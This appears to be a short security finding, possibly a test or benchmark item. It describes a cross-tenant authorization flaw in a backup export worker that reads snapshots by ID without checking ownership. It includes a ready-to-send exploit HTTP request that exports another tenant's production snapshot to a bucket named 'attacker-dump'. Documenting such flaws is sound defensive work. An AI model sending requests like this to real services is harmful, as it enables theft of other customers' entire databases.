diagnosis: The RunSnapshotExport worker accepts SnapshotJob items and reads database snapshots solely by SnapshotID. Because the worker fails to verify that the snapshot belongs to the submitting TenantID, an attacker can specify a competitor's snapshot ID and export their entire database contents to an external storage URI.
exploit_request:
POST /api/backups/dispatch HTTP/1.1
Host: db-ops.cloudstorage.net
Authorization: Bearer tenant_small_token
Content-Type: application/json

{"snapshot_id": "snap_prod_enterprise_772", "export_uri": "https://s3.amazonaws.com/attacker-dump/"}
